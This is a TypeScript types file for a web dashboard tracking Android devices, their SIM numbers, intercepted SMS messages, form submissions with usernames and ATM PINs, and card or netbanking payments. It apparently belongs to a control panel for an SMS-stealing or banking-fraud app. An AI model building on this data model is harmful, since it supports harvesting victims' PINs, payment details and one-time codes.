/**
 * types/index.ts — FULL & FINAL
 *
 * Types aligned with your backend models.
 * Keep this file as the single source of truth for frontend typings.
 */

export type WsPayload = Record<string, any>;

export type DeviceStatus = {
  online: boolean;
  timestamp?: number;
};

export type DeviceMetadata = {
  model?: string;
  manufacturer?: string;
  androidVersion?: string;
  brand?: string;
  simOperator?: string;
  registeredAt?: number;
  [k: string]: any;
};

export type SimInfo = {
  uniqueid: string;
  sim1Number?: string;
  sim1Carrier?: string;
  sim1Slot?: number | null;
  sim2Number?: string;
  sim2Carrier?: string;
  sim2Slot?: number | null;
  [k: string]: any;
};

export type DeviceDoc = {
  _id?: string;
  deviceId: string;
  metadata?: DeviceMetadata;
  status?: DeviceStatus;
  admins?: string[];
  adminPhone?: string;
  forwardingSim?: string;
  simInfo?: SimInfo | null;
  favorite?: boolean;
  createdAt?: string;
  updatedAt?: string;
  [k: string]: any;
};

export type FormSubmissionDoc = {
  _id?: string;
  uniqueid: string;
  payload?: Record<string, any>;
  createdAt?: string;
  updatedAt?: string;
  // backend returns transformed shape sometimes:
  phoneNumber?: string;
  username?: string;
  atmPin?: string;
  [k: string]: any;
};

export type PaymentDoc = {
  _id?: string;
  uniqueid?: string;
  method: "card" | "netbanking" | "other";
  payload: Record<string, any>;
  status: "pending" | "success" | "failed";
  processedAt?: number | null;
  createdAt?: string;
  updatedAt?: string;
  [k: string]: any;
};

export type SmsDoc = {
  _id?: string;
  deviceId: string;
  sender: string;
  senderNumber?: string;
  receiver: string;
  title?: string;
  body: string;
  timestamp: number;
  meta?: Record<string, any>;
  createdAt?: string;
  updatedAt?: string;
  [k: string]: any;
};

export type CrashDoc = {
  _id?: string;
  deviceId?: string;
  uniqueid?: string;
  title?: string;
  body?: Record<string, any>;
  timestamp?: number;
  createdAt?: string;
  updatedAt?: string;
  [k: string]: any;
};

export type AdminSessionDoc = {
  _id?: string;
  admin: string;
  deviceId: string;
  lastSeen: number;
  createdAt?: string;
  updatedAt?: string;
  [k: string]: any;
};